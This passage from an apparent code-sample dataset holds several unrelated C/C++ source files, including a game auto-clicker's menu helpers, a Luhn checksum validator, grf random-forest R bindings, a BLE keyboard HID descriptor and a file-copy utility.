close(fd);\n    return ret;\n}\n\nbool BootControlExt::SetBootRegionSlot(unsigned int slot) {\n  int boot_part = 0;\n\n\n  LOG(ERROR) << \"setActiveBootSlot SetBootRegionSlot \" << slot;\n  /* slot 0 is A , slot 1 is B */\n  if (slot >= 2) {\n    LOG(ERROR) << \"Wrong Slot value \" << slot;\n    return 0;\n  }\n\n  if(slot)\n    boot_part = 2;\n  else\n    boot_part = 1;\n\n  if (!ufs_set_active_boot_part(boot_part))\n      return false;\n\n  return true;\n}\n#else\nbool BootControlExt::SetBootRegionSlot(unsigned int slot) {\n  return true;\n}\n#endif //#if !defined(ARCH_X86)\n}\n}\n",
    "#include \"string_processing.h\"\n#include <iostream>\n\nusing namespace std::literals;\n\nbool SplitIntoWordsAndFindWord(const std::string& text) noexcept\n{\n    std::vector<std::string> words;\n    std::string word;\n    for (const char c : text) {\n        if (c == ' ' || c == '\\n') {\n            if (!word.empty()) {\n                words.push_back(word);\n                word.clear();\n            }\n        }\n        else {\n            word += c;\n        }\n    }\n    if (!word.empty()) {\n        words.push_back(word);\n    }\n    for (const auto& a : words) {\n        //Words kill and destroy, due to possible errors in recognition\n        if (a == \"destroyed!\"s || a == \"destroyed\"s || a == \"killed\"s || a == \"killed!\"s || a == \"destroyecy\"s || a == \"destrByed!\"s || a == \"killgu!\"s || a == \"killgu\"s || a == \"witHilled!\"s || a == \"witHilled\"s || a == \"killed?\u00ee\"s || a == \"kiiledt\"s || a == \"kinfer\"s || a == \"killedy\"s || a == \"killclr\"s || a == \"W@miiiiiin\"s || a == \"killedt\"s) {\n            return true;\n        }\n    }\n    return false;\n}\n\nvoid MenuMessage() noexcept{\n\n    system(\"CLS\");\n    std::cout << \"F1 - Left mouse auto clicker in app\"s << std::endl;\n    std::cout << \"F2 - Right mouse auto clicker in app\"s << std::endl;\n    std::cout << \"F3 - Space button auto clicker in app\"s << std::endl;\n    std::cout << \"F4 - Open GitHub\"s << std::endl;\n    std::cout << \"F5 - Open YouTube\"s << std::endl;\n    std::cout << \"F6 - Log mode\"s << std::endl;\n    std::cout << \"F7 - Farm mode\"s << std::endl;\n    std::cout << \"F8 - Set delay\"s << std::endl;\n    std::cout << \"F9 - Spam mode\"s << std::endl;\n\n    std::cout << \"\\nNext page right click + F2\"s << std::endl;\n    std::cout << \"Changing modes settings is on the second page\"s << std::endl;\n\n    std::cout << \"\\ndiscord: prizrak_p\\n\"s << std::endl;\n    std::cout << \"GitHub https://github.com/prizrak56\\n\\n\"s << std::endl;\n\n    std::cout << \" \\n\";\n    std::cout << \"   ____    ____    ___   _____  ____       _      _  __          ____  \\n\"s;\n    std::cout << \"  |  _ \\\\  |  _ \\\\  |_ _| |__  / |  _ \\\\     / \\\\    | |/ /         |  _ \\\\ \\n\"s;\n    std::cout << \"  | |_) | | |_) |  | |    / /  | |_) |   / _ \\\\   | ' /          | |_) |\\n\"s;\n    std::cout << \"  |  __/  |  _ <   | |   / /_  |  _ <   / ___ \\\\  | . \\\\          |  __/ \\n\"s;\n    std::cout << \"  |_|     |_| \\\\_\\\\ |___| /____| |_| \\\\_\\\\ /_/   \\\\_\\\\ |_|\\\\_\\\\  _____  |_|    \\n\"s;\n    std::cout << \"                                                        |_____|        \\n\"s;\n\n}\n\nvoid MenuMessage2() noexcept{\n\n    system(\"CLS\");\n    std::cout << \"F1 - Drop mode\"s << std::endl;\n    std::cout << \"F2 - Edit SpamMode settings\"s << std::endl;\n    std::cout << \"F3 - Edit DropMode settings\"s << std::endl;\n    std::cout << \"F4 - Edit Webhook\"s << std::endl;\n    std::cout << \"F5 - Edit FarmCoord\"s << std::endl;\n\n\n    std::cout << \"\\nPrevious page right click + F1\"s << std::endl;\n\n\n    std::cout << \"\\ndiscord: prizrak_p\\n\"s << std::endl;\n    std::cout << \"GitHub https://github.com/prizrak56\\n\\n\"s << std::endl;\n\n    std::cout << \" \\n\";\n    std::cout << \"   ____    ____    ___   _____  ____       _      _  __          ____  \\n\"s;\n    std::cout << \"  |  _ \\\\  |  _ \\\\  |_ _| |__  / |  _ \\\\     / \\\\    | |/ /         |  _ \\\\ \\n\"s;\n    std::cout << \"  | |_) | | |_) |  | |    / /  | |_) |   / _ \\\\   | ' /          | |_) |\\n\"s;\n    std::cout << \"  |  __/  |  _ <   | |   / /_  |  _ <   / ___ \\\\  | . \\\\          |  __/ \\n\"s;\n    std::cout << \"  |_|     |_| \\\\_\\\\ |___| /____| |_| \\\\_\\\\ /_/   \\\\_\\\\ |_|\\\\_\\\\  _____  |_|    \\n\"s;\n    std::cout << \"                                                        |_____|        \\n\"s;\n}\n\n\nstd::string ConvertLPCWSTRToString(LPCWSTR lpcwsz_str) noexcept{\n    \n    int str_length = WideCharToMultiByte(CP_UTF8, 0, lpcwsz_str, -1, nullptr, 0, nullptr, nullptr);\n\n    std::string str(str_length, 0);\n\n    WideCharToMultiByte(CP_UTF8, 0, lpcwsz_str, -1, &str[0],str_length, nullptr, nullptr);\n\n    return str;\n}\n\nstd::pair<int, int> ParseCoords(std::string& str) {\n\n    int x = 0;\n    int y = 0;\n    auto pos = str.find_first_of(':');\n    str = str.substr(pos + 1, str.length());\n\n    pos = str.find_first_of(',');\n\n    x = std::stoi(str.substr(0, pos));\n    y = std::stoi(str.substr(pos + 1, str.length()));\n    return std::make_pair(x,y);\n}\n\nstd::vector<std::string> ParseName(std::string& str) {\n    std::vector<std::string> result;\n    auto pos = str.find_first_of(':');\n    str = str.substr(pos + 2, str.length());\n    pos = str.find_first_of(',');\n    while (pos != std::string::npos) {\n        result.push_back(str.substr(0, pos));\n        str = str.substr(pos + 2, str.length());\n        pos = str.find_first_of(',');\n    }\n    result.push_back(str);\n    return result;\n}",
    "#include <stdio.h>\r\n#include <iostream>\r\n#include <string>\r\n\r\nusing namespace std;\r\n\r\nbool isNumberString(const string& s) {\r\n    int len = s.length();\r\n    for (int i = 0; i < len; i++) {\r\n        if (s[i] < '0' || s[i] > '9')\r\n            return false;\r\n    }\r\n    return true;\r\n}\r\n\r\nint main() {\r\n    string ccNumber;\r\n\r\n    cout << \"This program uses the Luhn Algorigthm to validate a CC number.\" << endl;\r\n    cout << \"You can enter 'exit' anytime to quit.\" << endl;\r\n\r\n    while (true) {\r\n\r\n        cout << \"Please enter a CC number to validate: \";\r\n        cin >> ccNumber;\r\n\r\n        if (ccNumber == \"exit\")\r\n            break;\r\n\r\n        else if (!isNumberString(ccNumber)) {\r\n            cout << \"Bad input! \";\r\n            continue;\r\n        }\r\n\r\n        int len = ccNumber.length();\r\n        int doubleEvenSum = 0;\r\n\r\n        // Step 1 is to double every second digit, starting from the right. If it\r\n        // results in a two digit number, add both the digits to obtain a single\r\n        // digit number. Finally, sum all the answers to obtain 'doubleEvenSum'.\r\n\r\n        for (int i = len - 2; i >= 0; i = i - 2) {\r\n            int dbl = ((ccNumber[i] - 48) * 2);\r\n            if (dbl > 9) {\r\n                dbl = (dbl / 10) + (dbl % 10);\r\n            }\r\n            doubleEvenSum += dbl;\r\n        }\r\n\r\n        // Step 2 is to add every odd placed digit from the right to the value\r\n        // 'doubleEvenSum'.\r\n\r\n        for (int i = len - 1; i >= 0; i = i - 2) {\r\n            doubleEvenSum += (ccNumber[i] - 48);\r\n        }\r\n\r\n        // Step 3 is to check if the final 'doubleEvenSum' is a multiple of 10.\r\n        // If yes, it is a valid CC number. Otherwise, not.\r\n\r\n        cout << (doubleEvenSum % 10 == 0 ? \"Valid!\" : \"Invalid!\") << endl;\r\n\r\n        continue;\r\n    }\r\n\r\n    return 0;\r\n}\r\n",
    "// /******************************************************************************\n//  * Copyright 2018 The Apollo Authors. All Rights Reserved.\n//  *\n//  * Licensed under the Apache License, Version 2.0 (the \"License\");\n//  * you may not use this file except in compliance with the License.\n//  * You may obtain a copy of the License at\n//  *\n//  * http://www.apache.org/licenses/LICENSE-2.0\n//  *\n//  * Unless required by applicable law or agreed to in writing, software\n//  * distributed under the License is distributed on an \"AS IS\" BASIS,\n//  * WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied.\n//  * See the License for the specific language governing permissions and\n//  * limitations under the License.\n//  *****************************************************************************/\n\n// /**\n//  * @file\n//  **/\n\n// #include \"modules/planning/common/trajectory/discretized_trajectory.h\"\n\n// #include \"cyber/common/file.h\"\n// #include \"gtest/gtest.h\"\n\n// namespace apollo {\n// namespace planning {\n\n// TEST(basic_test, DiscretizedTrajectory) {\n//   const std::string path_of_standard_trajectory =\n//       \"modules/planning/testdata/trajectory_data/standard_trajectory.pb.txt\";\n//   ADCTrajectory trajectory;\n//   EXPECT_TRUE(cyber::common::GetProtoFromFile(path_of_standard_trajectory,\n//                                               &trajectory));\n//   DiscretizedTrajectory discretized_trajectory(trajectory);\n//   EXPECT_DOUBLE_EQ(discretized_trajectory.GetTemporalLength(),\n//                    7.9999999999999885);\n//   EXPECT_DOUBLE_EQ(discretized_trajectory.GetSpatialLength(),\n//                    44.752319202675167);\n//   auto p1 = discretized_trajectory.Evaluate(4.0);\n//   EXPECT_DOUBLE_EQ(p1.path_point().x(), 587263.01182131236);\n//   EXPECT_DOUBLE_EQ(p1.path_point().y(), 4140966.5720794979);\n//   EXPECT_DOUBLE_EQ(p1.relative_time(), 4.0);\n//   EXPECT_DOUBLE_EQ(p1.v(), 5.4412586837131443);\n\n//   auto k1 = discretized_trajectory.QueryLowerBoundPoint(2.12);\n//   EXPECT_EQ(k1, 62);\n\n//   auto k2 = discretized_trajectory.QueryNearestPoint({587264.0, 4140966.2});\n//   EXPECT_EQ(k2, 80);\n\n//   EXPECT_EQ(discretized_trajectory.NumOfPoints(), 121);\n// }\n\n// }  // namespace planning\n// }  // namespace apollo\n",
    "#include <iostream>\r\n#include <fstream>\r\nusing namespace std;\r\n\r\nclass student\r\n{\r\npublic:\r\n\tint roll;\r\n\tchar div;\r\n\tchar name[10];\r\n\r\n\tvoid take()\r\n\t{\r\n\t\tcout << \"\\nEnter name:\";\r\n\t\tcin >> name;\r\n\t\tcout << \"\\nEnter roll no:\";\r\n\t\tcin >> roll;\r\n\t\tcout << \"\\nEnter div:\";\r\n\t\tcin >> div;\r\n\t}\r\n\r\n\tvoid put()\r\n\t{\r\n\t\tcout << \"Name:\" << name << endl;\r\n\t\tcout << \"Roll no:\" << roll << endl;\r\n\t\tcout << \"Div:\" << div << endl;\r\n\t}\r\n};\r\n\r\nint main()\r\n{\r\n\tint ch;\r\n\tint n;\r\n\r\n\tdo\r\n\t{\r\n\t\tcout << \"1.create and write\\n2.read\\n3.search\\n4.append\\n5.delete\\n\";\r\n\t\tcout << \"Choose option:\";\r\n\t\tcin >> ch;\r\n\r\n\t\tswitch (ch)\r\n\t\t{\r\n\r\n\t\tcase 1:\r\n\t\t{\r\n\t\t\tcout << \"Enter no of students:\";\r\n\t\t\tcin >> n;\r\n\t\t\tstudent s[10];\r\n\t\t\tint i;\r\n\t\t\tfstream fp;\r\n\t\t\tfp.open(\"student.txt\", ios::out);\r\n\t\t\tcout << endl;\r\n\t\t\tfor (i = 0; i < n; i++)\r\n\t\t\t{\r\n\t\t\t\ts[i].take();\r\n\t\t\t\tfp.write((char *)&s[i], sizeof(s[i]));\r\n\t\t\t}\r\n\t\t\tbreak;\r\n\t\t}\r\n\t\tcase 2:\r\n\t\t{\r\n\t\t\tfstream fr;\r\n\t\t\tfr.open(\"student.txt\", ios::in);\r\n\t\t\tstudent s1;\r\n\t\t\twhile (fr.read((char *)&s1, sizeof(s1)))\r\n\t\t\t{\r\n\t\t\t\t// fr.read((char*)&s1[i],sizeof(s1[i]));\r\n\t\t\t\ts1.put();\r\n\t\t\t}\r\n\t\t\tbreak;\r\n\t\t}\r\n\t\tcase 3:\r\n\t\t{\r\n\r\n\t\t\tstudent s;\r\n\t\t\tint r;\r\n\t\t\tint flag = 0;\r\n\t\t\tcout << \"Enter roll no to be searched:\";\r\n\t\t\tcin >> r;\r\n\t\t\tfstream fs;\r\n\t\t\tfs.open(\"student.txt\", ios::in);\r\n\t\t\twhile (fs.read((char *)&s, sizeof(s)))\r\n\t\t\t{\r\n\t\t\t\tif (s.roll == r)\r\n\t\t\t\t{\r\n\t\t\t\t\tcout << \"record found\\n\";\r\n\t\t\t\t\ts.put();\r\n\t\t\t\t\tflag = 1;\r\n\t\t\t\t}\r\n\t\t\t}\r\n\t\t\tif (flag == 0)\r\n\t\t\t\tcout << \"Record not found\\n\";\r\n\t\t\tbreak;\r\n\t\t}\r\n\t\tcase 4:\r\n\t\t{\r\n\t\t\tstudent s[10];\r\n\t\t\tint i;\r\n\t\t\tint n1;\r\n\t\t\tfstream fa;\r\n\t\t\tfa.open(\"student.txt\", ios::app);\r\n\t\t\tcout << \"Enter no of student you want to add:\";\r\n\t\t\tcin >> n1;\r\n\t\t\tfor (i = 0; i < n1; i++)\r\n\t\t\t{\r\n\t\t\t\ts[i].take();\r\n\t\t\t\tfa.write((char *)&s[i], sizeof(s[i]));\r\n\t\t\t}\r\n\t\t\tbreak;\r\n\t\t}\r\n\t\tcase 5:\r\n\t\t{\r\n\t\t\tfstream fp;\r\n\t\t\tfstream fp1;\r\n\t\t\tint delroll;\r\n\t\t\tint flag = 0;\r\n\t\t\tstudent s;\r\n\t\t\tfp.open(\"student.txt\", ios::in);\r\n\t\t\tfp1.open(\"stud.txt\", ios::out);\r\n\t\t\tcout << \"Enter roll to be deleted:\";\r\n\t\t\tcin >> delroll;\r\n\t\t\twhile (fp.read((char *)&s, sizeof(s)))\r\n\t\t\t{\r\n\t\t\t\tif (s.roll == delroll)\r\n\t\t\t\t{\r\n\t\t\t\t\tcout << \"record found\\n\";\r\n\t\t\t\t\ts.put();\r\n\t\t\t\t\tflag = 1;\r\n\t\t\t\t}\r\n\t\t\t\telse\r\n\t\t\t\t\tfp1.write((char *)&s, sizeof(s));\r\n\t\t\t}\r\n\t\t\tfp.close();\t // Close file stream for reading\r\n\t\t\tfp1.close(); // Close file stream for writing\r\n\t\t\tremove(\"student.txt\");\r\n\t\t\trename(\"stud.txt\", \"student.txt\");\r\n\t\t\tif (flag == 0)\r\n\t\t\t\tcout << \"Record not found\\n\";\r\n\t\t\tbreak;\r\n\t\t}\r\n\t\t}\r\n\t} while (ch != 0);\r\n\treturn 0;\r\n}\r\n",
    "/*-------------------------------------------------------------------------------\n  This file is part of generalized random forest (grf).\n\n  grf is free software: you can redistribute it and/or modify\n  it under the terms of the GNU General Public License as published by\n  the Free Software Foundation, either version 3 of the License, or\n  (at your option) any later version.\n\n  grf is distributed in the hope that it will be useful,\n  but WITHOUT ANY WARRANTY; without even the implied warranty of\n  MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE. See the\n  GNU General Public License for more details.\n\n  You should have received a copy of the GNU General Public License\n  along with grf. If not, see <http://www.gnu.org/licenses/>.\n #-------------------------------------------------------------------------------*/\n\n#include <Rcpp.h>\n#include <vector>\n\n#include \"commons/globals.h\"\n#include \"forest/ForestPredictors.h\"\n#include \"forest/ForestTrainers.h\"\n#include \"RcppUtilities.h\"\n\nusing namespace grf;\n\n// [[Rcpp::export]]\nRcpp::List multi_regression_train(const Rcpp::NumericMatrix& train_matrix,\n                                  const std::vector<size_t>& outcome_index,\n                                  size_t sample_weight_index,\n                                  bool use_sample_weights,\n                                  unsigned int mtry,\n                                  unsigned int num_trees,\n                                  unsigned int min_node_size,\n                                  double sample_fraction,\n                                  bool honesty,\n                                  double honesty_fraction,\n                                  bool honesty_prune_leaves,\n                                  double alpha,\n                                  double imbalance_penalty,\n                                  std::vector<size_t>& clusters,\n                                  unsigned int samples_per_cluster,\n                                  bool compute_oob_predictions,\n                                  unsigned int num_threads,\n                                  unsigned int seed) {\n  Data data = RcppUtilities::convert_data(train_matrix);\n  data.set_outcome_index(outcome_index);\n  if (use_sample_weights) {\n    data.set_weight_index(sample_weight_index);\n  }\n\n  size_t ci_group_size = 1;\n  ForestOptions options(num_trees, ci_group_size, sample_fraction, mtry, min_node_size, honesty,\n      honesty_fraction, honesty_prune_leaves, alpha, imbalance_penalty, num_threads, seed, clusters, samples_per_cluster);\n  ForestTrainer trainer = multi_regression_trainer(data.get_num_outcomes());\n  Forest forest = trainer.train(data, options);\n\n  std::vector<Prediction> predictions;\n  if (compute_oob_predictions) {\n    ForestPredictor predictor = multi_regression_predictor(num_threads, data.get_num_outcomes());\n    predictions = predictor.predict_oob(forest, data, false);\n  }\n\n  return RcppUtilities::create_forest_object(forest, predictions);\n}\n\n// [[Rcpp::export]]\nRcpp::List multi_regression_predict(const Rcpp::List& forest_object,\n                                    const Rcpp::NumericMatrix& train_matrix,\n                                    const Rcpp::NumericMatrix& test_matrix,\n                                    size_t num_outcomes,\n                                    unsigned int num_threads) {\n  Data train_data = RcppUtilities::convert_data(train_matrix);\n\n  Data data = RcppUtilities::convert_data(test_matrix);\n  Forest forest = RcppUtilities::deserialize_forest(forest_object);\n  bool estimate_variance = false;\n  ForestPredictor predictor = multi_regression_predictor(num_threads, num_outcomes);\n  std::vector<Prediction> predictions = predictor.predict(forest, train_data, data, estimate_variance);\n\n  return RcppUtilities::create_prediction_object(predictions);\n}\n\n// [[Rcpp::export]]\nRcpp::List multi_regression_predict_oob(const Rcpp::List& forest_object,\n                                        const Rcpp::NumericMatrix& train_matrix,\n                                        size_t num_outcomes,\n                                        unsigned int num_threads) {\n  Data data = RcppUtilities::convert_data(train_matrix);\n\n  Forest forest = RcppUtilities::deserialize_forest(forest_object);\n  bool estimate_variance = false;\n  ForestPredictor predictor = multi_regression_predictor(num_threads, num_outcomes);\n  std::vector<Prediction> predictions = predictor.predict_oob(forest, data, estimate_variance);\n\n  Rcpp::List result = RcppUtilities::create_prediction_object(predictions);\n  return result;\n}\n",
    "#include \"BleKeyboard.h\"\n\n#if defined(USE_NIMBLE)\n#include <NimBLEDevice.h>\n#include <NimBLEServer.h>\n#include <NimBLEUtils.h>\n#include <NimBLEHIDDevice.h>\n#else\n#include <BLEDevice.h>\n#include <BLEUtils.h>\n#include <BLEServer.h>\n#include \"BLE2902.h\"\n#include \"BLEHIDDevice.h\"\n#endif // USE_NIMBLE\n#include \"HIDTypes.h\"\n#include <driver/adc.h>\n#include \"sdkconfig.h\"\n\n\n#if defined(CONFIG_ARDUHAL_ESP_LOG)\n  #include \"esp32-hal-log.h\"\n  #define LOG_TAG \"\"\n#else\n  #include \"esp_log.h\"\n  static const char* LOG_TAG = \"BLEDevice\";\n#endif\n\n\n// Report IDs:\n#define KEYBOARD_ID 0x01\n#define MEDIA_KEYS_ID 0x02\n\nstatic const uint8_t _hidReportDescriptor[] = {\n  USAGE_PAGE(1),      0x01,          // USAGE_PAGE (Generic Desktop Ctrls)\n  USAGE(1),           0x06,          // USAGE (Keyboard)\n  COLLECTION(1),      0x01,          // COLLECTION (Application)\n  // ------------------------------------------------- Keyboard\n  REPORT_ID(1),       KEYBOARD_ID,   //   REPORT_ID (1)\n  USAGE_PAGE(1),      0x07,          //   USAGE_PAGE (Kbrd/Keypad)\n  USAGE_MINIMUM(1),   0xE0,          //   USAGE_MINIMUM (0xE0)\n  USAGE_MAXIMUM(1),   0xE7,          //   USAGE_MAXIMUM (0xE7)\n  LOGICAL_MINIMUM(1), 0x00,          //   LOGICAL_MINIMUM (0)\n  LOGICAL_MAXIMUM(1), 0x01,          //   Logical Maximum (1)\n  REPORT_SIZE(1),     0x01,          //   REPORT_SIZE (1)\n  REPORT_COUNT(1),    0x08,          //   REPORT_COUNT (8)\n  HIDINPUT(1),        0x02,          //   INPUT (Data,Var,Abs,No Wrap,Linear,Preferred State,No Null Position)\n  REPORT_COUNT(1),    0x01,          //   REPORT_COUNT (1) ; 1 byte (Reserved)\n  REPORT_SIZE(1),     0x08,          //   REPORT_SIZE (8)\n  HIDINPUT(1),        0x01,          //   INPUT (Const,Array,Abs,No Wrap,Linear,Preferred State,No Null Position)\n  REPORT_COUNT(1),    0x05,          //   REPORT_COUNT (5) ; 5 bits (Num lock, Caps lock, Scroll lock, Compose, Kana)\n  REPORT_SIZE(1),     0x01,          //   REPORT_SIZE (1)\n  USAGE_PAGE(1),      0x08,          //   USAGE_PAGE (LEDs)\n  USAGE_MINIMUM(1),   0x01,          //   USAGE_MINIMUM (0x01) ; Num Lock\n  USAGE_MAXIMUM(1),   0x05,          //   USAGE_MAXIMUM (0x05) ; Kana\n  HIDOUTPUT(1),       0x02,          //   OUTPUT (Data,Var,Abs,No Wrap,Linear,Preferred State,No Null Position,Non-volatile)\n  REPORT_COUNT(1),    0x01,          //   REPORT_COUNT (1) ; 3 bits (Padding)\n  REPORT_SIZE(1),     0x03,          //   REPORT_SIZE (3)\n  HIDOUTPUT(1),       0x01,          //   OUTPUT (Const,Array,Abs,No Wrap,Linear,Preferred State,No Null Position,Non-volatile)\n  REPORT_COUNT(1),    0x06,          //   REPORT_COUNT (6) ; 6 bytes (Keys)\n  REPORT_SIZE(1),     0x08,          //   REPORT_SIZE(8)\n  LOGICAL_MINIMUM(1), 0x00,          //   LOGICAL_MINIMUM(0)\n  LOGICAL_MAXIMUM(1), 0x73,          //   LOGICAL_MAXIMUM(0x65) ; 101 keys\n  USAGE_PAGE(1),      0x07,          //   USAGE_PAGE (Kbrd/Keypad)\n  USAGE_MINIMUM(1),   0x00,          //   USAGE_MINIMUM (0)\n  USAGE_MAXIMUM(1),   0x73,          //   USAGE_MAXIMUM ()\n  HIDINPUT(1),        0x00,          //   INPUT (Data,Array,Abs,No Wrap,Linear,Preferred State,No Null Position)\n  END_COLLECTION(0),                 // END_COLLECTION\n  // ------------------------------------------------- Media Keys\n  USAGE_PAGE(1),      0x0C,          // USAGE_PAGE (Consumer)\n  USAGE(1),           0x01,          // USAGE (Consumer Control)\n  COLLECTION(1),      0x01,          // COLLECTION (Application)\n  REPORT_ID(1),       MEDIA_KEYS_ID, //   REPORT_ID (3)\n  USAGE_PAGE(1),      0x0C,          //   USAGE_PAGE (Consumer)\n  LOGICAL_MINIMUM(1), 0x00,          //   LOGICAL_MINIMUM (0)\n  LOGICAL_MAXIMUM(1), 0x01,          //   LOGICAL_MAXIMUM (1)\n  REPORT_SIZE(1),     0x01,          //   REPORT_SIZE (1)\n  REPORT_COUNT(1),    0x10,          //   REPORT_COUNT (16)\n  USAGE(1),           0xB5,          //   USAGE (Scan Next Track)     ; bit 0: 1\n  USAGE(1),           0xB6,          //   USAGE (Scan Previous Track) ; bit 1: 2\n  USAGE(1),           0xB7,          //   USAGE (Stop)                ; bit 2: 4\n  USAGE(1),           0xCD,          //   USAGE (Play/Pause)          ; bit 3: 8\n  USAGE(1),           0xE2,          //   USAGE (Mute)                ; bit 4: 16\n  USAGE(1),           0xE9,          //   USAGE (Volume Increment)    ; bit 5: 32\n  USAGE(1),           0xEA,          //   USAGE (Volume Decrement)    ; bit 6: 64\n  USAGE(2),           0x23, 0x02,    //   Usage (WWW Home)            ; bit 7: 128\n  USAGE(2),           0x94, 0x01,    //   Usage (My Computer) ; bit 0: 1\n  USAGE(2),           0x92, 0x01,    //   Usage (Calculator)  ; bit 1: 2\n  USAGE(2),           0x2A, 0x02,    //   Usage (WWW fav)     ; bit 2: 4\n  USAGE(2),           0x21, 0x02,    //   Usage (WWW search)  ; bit 3: 8\n  USAGE(2),           0x26, 0x02,    //   Usage (WWW stop)    ; bit 4: 16\n  USAGE(2),           0x24, 0x02,    //   Usage (WWW back)    ; bit 5: 32\n  USAGE(2),           0x83, 0x01,    //   Usage (Media sel)   ; bit 6: 64\n  USAGE(2),           0x8A, 0x01,    //   Usage (Mail) ",
    "// Use with instructions.xml retrieved from uops.info\n\n#include <algorithm>\n#include <assert.h>\n#include <limits>\n#include <stdio.h>\n#include <string>\n#include <string.h>\n#include <pugixml.hpp>\n#include <unordered_map>\n#include <vector>\n\nstruct Dictionary\n{\n    int Get( const std::string& str )\n    {\n        auto it = str2idx.find( str );\n        if( it != str2idx.end() ) return it->second;\n        const auto idx = strlist.size();\n        str2idx.emplace( str, idx );\n        strlist.emplace_back( str );\n        return idx;\n    }\n\n    int Get( const char* str ) { return Get( std::string( str ) ); }\n\n    const std::string& Get( int idx ) const\n    {\n        return strlist[idx];\n    }\n\n    size_t Size() const { return strlist.size(); }\n\n    std::unordered_map<std::string, int> str2idx;\n    std::vector<std::string> strlist;\n};\n\nstruct ParamDesc\n{\n    int type;\n    int width;\n};\n\nstruct Variant\n{\n    std::vector<ParamDesc> desc;\n    int isaSet;\n    float tp;\n    int port, uops, minlat, maxlat;\n    bool minbound, maxbound;\n};\n\nstruct Op\n{\n    std::vector<Variant> var;\n    int desc;\n};\n\nstruct UArch\n{\n    std::unordered_map<int, Op> ops;\n};\n\nconst std::vector<std::pair<const char*, const char*>> LatencyValues = {\n    { \"cycles\", \"cycles_is_upper_bound\" },\n    { \"cycles_addr\", \"cycles_addr_is_upper_bound\" },\n    { \"cycles_addr_same_reg\", \"cycles_addr_same_reg_is_upper_bound\" },\n    { \"cycles_addr_VSIB\", \"cycles_addr_VSIB_is_upper_bound\" },\n    { \"cycles_mem\", \"cycles_mem_is_upper_bound\" },\n    { \"cycles_mem_same_reg\", \"cycles_mem_same_reg_is_upper_bound\" },\n    { \"cycles_same_reg\", \"cycles_same_reg_is_upper_bound\" },\n    { \"max_cycles\", \"max_cycles_is_upper_bound\" },\n    { \"max_cycles_addr\", \"max_cycles_addr_is_upper_bound\" },\n    { \"min_cycles\", \"min_cycles_is_upper_bound\" },\n    { \"min_cycles_addr\", \"min_cycles_addr_is_upper_bound\" },\n};\n\nint main()\n{\n    pugi::xml_document doc;\n    doc.load_file( \"instructions.xml\" );\n    auto root = doc.child( \"root\" );\n\n    Dictionary ops;\n    Dictionary opsdesc;\n    Dictionary uarchs;\n    Dictionary ports;\n    Dictionary isas;\n\n    std::vector<UArch> uav;\n\n    for( auto& ext : root )\n    {\n        assert( strcmp( ext.name(), \"extension\" ) == 0 );\n        for( auto& op : ext )\n        {\n            assert( strcmp( op.name(), \"instruction\" ) == 0 );\n            auto opstr = op.attribute( \"asm\" ).value();\n            auto opdesc = op.attribute( \"summary\" ).value();\n            bool magic = false;\n            if( opstr[0] == '{' )\n            {\n                if( memcmp( opstr, \"{load} \", 7 ) == 0 )\n                {\n                    magic = true;\n                    opstr += 7;\n                }\n                else\n                {\n                    continue;\n                }\n            }\n            char tmpbuf[64];\n            auto opstr2 = op.attribute( \"string\" ).value();\n            const auto strnext = opstr2[strlen(opstr)];\n            if( !magic && strnext != ' ' && strnext != '\\0' )\n            {\n                if( memcmp( opstr2, \"LEA_\", 4 ) == 0 )\n                {\n                    auto ptr = tmpbuf;\n                    opstr = tmpbuf;\n                    while( *opstr2 != ' ' ) *ptr++ = *opstr2++;\n                    *ptr = '\\0';\n                }\n                else\n                {\n                    continue;\n                }\n            }\n            const auto opidx = ops.Get( opstr );\n            const auto opdescidx = opsdesc.Get( opdesc );\n\n            int isaSet = isas.Get( op.attribute( \"isa-set\" ).value() );\n\n            std::vector<ParamDesc> desc;\n            for( auto& param : op.children( \"operand\" ) )\n            {\n                if( !param.attribute( \"suppressed\" ) )\n                {\n                    int type = 0;\n                    if( strcmp( param.attribute( \"type\" ).value(), \"imm\" ) == 0 ) type = 0;\n                    else if( strcmp( param.attribute( \"type\" ).value(), \"reg\" ) == 0 ) type = 1;\n                    else if( strcmp( param.attribute( \"type\" ).value(), \"mem\" ) == 0 ) type = 2;\n                    else if( strcmp( param.attribute( \"type\" ).value(), \"agen\" ) == 0 ) type = 2;\n                    desc.emplace_back( ParamDesc { type, atoi( param.attribute( \"width\" ).value() ) } );\n                }\n            }\n\n            for( auto& ua : op.children( \"architecture\" ) )\n            {\n                auto measurement = ua.child( \"measurement\" );\n                if( measurement )\n                {\n                    const auto uaidx = uarchs.Get( ua.attribute( \"name\" ).value() );\n                    if( uav.size() <= uaidx ) uav.emplace_back( UArch {} );\n                    auto& uai = uav[uaidx];\n                    auto& opi = uai.ops[opidx];\n                    opi.desc = opdescidx;\n\n                    float tp = -1;\n                    if( measurement.attribute( \"TP\" ) ) tp = atof( measurement.attribute( \"TP\" ).value() );\n                    else if( measurement.attribute( \"TP_ports\" ) ) tp = atof( measuremen",
    "#include \"../include/copyOperator.h\"\n\nvoid FileCopyOperator::showVersion(void)\n{\n    printSplitLine(45, '-');\n    WARNING_LOG(\"Software version: \" + SOFTWARE_VERSION + '\\n'); \n    printSplitLine(45, '-');\n\n}\n\nvoid FileCopyOperator::showHelp(void)\n{\n    printSplitLine(65, '-');\n\n    loger(\n            std::clog, NOTIFY,\n            \"Usage:\\n\",\n            \"mycp --help     Get help info.\\n\",\n            \"mycp --version  Get version.\\n\",\n            \"mycp [sorce file] [target path] Copy sorce file to target path.\\n\"\n        );\n\n    printSplitLine(65, '-');\n}\n\nvoid FileCopyOperator::forwardBackwardSwitch(std::string & __path)\n{\n    /*\n        \u82e5\u5728 __srcFile \u4e2d\u6ca1\u6709\u627e\u5230 / \u6216 \\ \u5b57\u7b26\uff0c\n        \u5219\u4ee3\u8868\u5b83\u53ef\u80fd\u662f\u4e00\u4e2a\u7eaf\u6587\u4ef6\uff0c\u6216\u8005\u975e\u6cd5\u5b57\u7b26\u4e32\uff0c\u76f4\u63a5\u539f\u8def\u8fd4\u56de\u5c31\u597d\u3002\n    */\n    if ((__path.find('/') == __path.npos) && (__path.find('\\\\') == __path.npos)) { return; }\n\n    std::replace(__path.begin(), __path.end(), '/', OS_SPECIFIC_SLASH);\n    std::replace(__path.begin(), __path.end(), '\\\\', OS_SPECIFIC_SLASH);\n}\n\nstd::string FileCopyOperator::getFileType(const std::string & __srcFile)\n{\n    /*\u83b7\u53d6 . \u5b57\u7b26\u7b2c\u4e00\u6b21\u51fa\u73b0\u5728\u5b57\u7b26\u4e32 __srcFile 